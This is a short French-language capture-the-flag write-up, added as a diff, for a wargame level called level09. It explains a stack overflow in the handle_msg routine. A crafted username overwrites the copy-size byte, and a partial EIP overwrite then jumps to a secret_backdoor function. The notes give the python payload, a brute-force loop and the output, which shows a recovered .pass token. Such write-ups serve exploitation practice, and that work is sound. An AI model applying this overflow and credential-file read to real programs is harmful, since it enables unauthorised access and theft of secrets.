@@ -1,0 +1,30 @@
+in handle_msg:
+    buffer:                 $sp
+    buffer username:        $sp+140
+    buffer size to copy:    $sp+180
+    eip:                    $sp+200
+
+
+avec set_username on ecris dans la case 181 de msg_buffer qui represente le nombre de bytes copie dans msg_buffer dans la fonction set_msg
+on set avec "A"*40 + "\xca" le nombre de bytes copie dans msg_buffer a 202
+
+dans set_msg on change les 2 dernier bytes de l'address dans eip
+qui contenait l'address de main pour example 0x0000555555554abd
+on met 488c pour l'address de la function secret_backdoor 0x000055555555488c
+
+offset of secret_backdoor compared to main
+&secret_backdoor = &main - 561
+
+python -c 'print "A"*40 + "\xca" + "\n" + "B"*200 + "\x8c\x48" + "\n" + "cat /home/users/end/.pass\n"' > /tmp/level09_overflow
+
+cnt=0; while [ $cnt -lt 1000 ]; do cat /tmp/level09_overflow | ./level09 >> /tmp/level09_out ; let cnt++; done;
+
+$ cat /tmp/level09_overflow | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+Segmentation fault (core dumped)
